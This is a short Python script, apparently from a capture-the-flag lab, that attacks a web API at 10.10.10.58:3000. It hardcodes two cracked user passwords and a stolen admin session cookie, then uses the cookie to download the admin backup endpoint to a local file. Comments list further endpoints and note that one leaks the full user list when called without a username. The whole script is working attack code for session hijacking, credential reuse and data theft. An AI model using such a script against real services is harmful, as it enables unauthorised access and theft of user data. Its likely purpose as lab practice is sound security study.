import requests

# users
tom = {"username": "tom", "password": "spongebob"}
mark = {"username": "mark", "password": "snowflake"}

DOMAIN = "http://10.10.10.58:3000"
COOKIES = {"connect.sid": "s%3AfeJkY5KY3n7ybntD90RD1OKJX2BsStHG.4HZq4nHSLT0icLNYDkDVUKeg3eC03dSRtPFmjV1kyT0"} # admin cookie

def get(url):
    url = DOMAIN + url
    r = requests.get(url, cookies=COOKIES)
    with open('backup.txt', 'w') as f:
        f.write(r.text)

def post(url, body):
    url = DOMAIN + url
    r = requests.post(url, data=body, cookies=COOKIES)
    print(r.text)


if __name__ == "__main__":
    # admin backup
    admin_backup = "/api/admin/backup"                        # GET
    get(admin_backup)

    # get current session
    session = "/api/session"                                  # GET
    # get(session)

    # get latest user info
    users_latest = "/api/users/latest"                        # GET
    # get(users_latest)

    # get user info
    users_username = "/api/users/"                            # GET /username
    # get(users_username)  # calling without username gives full userlist

    # authenticate
    session_authenticate = "/api/session/authenticate"        # POST {"username", "password"}
    # post(session_authenticate, tom)

